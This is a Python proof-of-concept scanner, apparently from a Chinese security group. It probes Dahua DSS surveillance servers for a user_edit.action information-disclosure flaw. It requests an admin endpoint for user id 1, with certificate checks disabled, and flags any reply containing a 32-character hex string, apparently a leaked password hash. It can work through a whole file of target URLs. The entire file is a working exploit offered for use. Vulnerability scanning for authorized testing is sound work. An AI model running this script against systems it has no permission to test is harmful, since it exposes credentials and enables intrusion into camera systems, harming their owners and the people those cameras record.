#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
import re
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# 打印颜色
RED = '\033[91m'
RESET = '\033[0m'
# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/admin/cascade_/user_edit.action?id=1"
  
        # 向服务器发送请求
        response = requests.get(attack_url, verify=False, timeout=10)
        # 根据描述设置匹配条件，检查正则匹配
        regex_patterns = [
            '[0-9a-f]{32}'
        ]

        data_disclosed = False  # 标记是否发现信息泄露

        for pattern in regex_patterns:
            if re.search(pattern, response.text):
                print(f"{RED}URL [{url}] 存在大华 DSS 数字监控系统user_edit.action 信息泄露漏洞。{RESET}")
                data_disclosed = True
                break  # 匹配到则跳出循环

        if not data_disclosed:
            print(f"URL [{url}] 未发现漏洞。")
            
    except RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在大华 DSS 数字监控系统user_edit.action 信息泄露漏洞。')
    parser.add_argument('-u', '--url', help='指定目标URL')
    parser.add_argument('-f', '--file', help='指定包含多个目标URL的文本文件')

    args = parser.parse_args()

    if args.url:
        # 如果URL未以http://或https://开头，则添加http://
        args.url = "http://" + args.url.strip("/") if not args.url.startswith(("http://", "https://")) else args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                url = "http://" + url.strip("/") if not url.startswith(("http://", "https://")) else url
                check_vulnerability(url)

if __name__ == '__main__':
    main()